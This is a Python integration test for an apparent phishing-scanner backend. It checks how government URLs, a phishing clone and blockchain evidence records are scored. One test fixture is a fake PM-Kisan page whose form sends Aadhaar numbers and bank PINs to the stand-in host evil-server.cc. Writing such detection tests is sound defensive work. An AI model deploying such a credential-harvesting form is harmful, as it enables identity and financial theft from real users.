from fastapi.testclient import TestClient
from backend.main import app

def test_integration_contracts():
    client = TestClient(app)

    # 1. Test genuine gov scan (website & extension)
    r1 = client.post("/api/scan", json={"url": "https://pmkisan.gov.in"})
    assert r1.status_code == 200, f"Status {r1.status_code}"
    d1 = r1.json()
    assert d1["is_genuine_gov_tld"] is True
    assert d1["verdict"] in ["LEGITIMATE", "NO_SIGNIFICANT_INDICATORS"]
    assert d1["risk_score"] <= 10
    assert "blockchain_proof" in d1
    assert "blockchain_audit" in d1
    print("✓ Contract 1 Passed: Genuine government URL scan (/api/scan)")

    # 2. Test phishing clone with extension DOM HTML extraction
    phish_html = """
    <html>
      <body>
        <h1>PM-Kisan Samman Nidhi - Direct Benefit Transfer</h1>
        <form action="https://evil-server.cc/collect.php" method="POST">
          <input type="text" name="aadhaar_number" placeholder="Enter Aadhaar Number" />
          <input type="password" name="bank_mpin" placeholder="Enter UPI / Bank PIN" />
          <input type="submit" value="Claim Rs 6000 Instantly" />
        </form>
      </body>
    </html>
    """
    r2 = client.post("/api/scan", json={"url": "http://pmkisan-subsidy-online.xyz", "html_content": phish_html})
    assert r2.status_code == 200, f"Status {r2.status_code}"
    d2 = r2.json()
    assert d2["verdict"] == "PHISHING_CLONE", f"Expected PHISHING_CLONE, got {d2['verdict']}"
    assert d2["risk_score"] >= 80, f"Expected risk >= 80, got {d2['risk_score']}"
    assert "blockchain_proof" in d2, "Missing blockchain_proof"
    assert "blockchain_audit" in d2, "Missing blockchain_audit"
    assert d2["blockchain_proof"]["block_index"] > 0
    print("✓ Contract 2 Passed: Phishing scan with extension DOM HTML & PoA Blockchain Anchoring")

    # 3. Test quick pre-flight check endpoint
    r3 = client.post("/api/quick-check", json={"url": "https://incometax.gov.in"})
    assert r3.status_code == 200
    d3 = r3.json()
    assert d3["verdict"] == "LEGITIMATE"
    assert "blockchain_audit" in d3
    print("✓ Contract 3 Passed: Quick check preflight (/api/quick-check)")

    # 4. Test on-chain evidence verification endpoint
    incident_id = d2["blockchain_proof"].get("incident_id")
    if incident_id:
        r4 = client.get(f"/api/blockchain/verify-evidence/{incident_id}")
        assert r4.status_code == 200
        d4 = r4.json()
        assert d4["tamper_status"] == "AUTHENTIC"
        print(f"✓ Contract 4 Passed: On-chain evidence audit verified for {incident_id}")

    print("\nALL FRONTEND & EXTENSION INTEGRATION CONTRACTS PASSED WITH 100% SUCCESS!")

if __name__ == "__main__":
    test_integration_contracts()
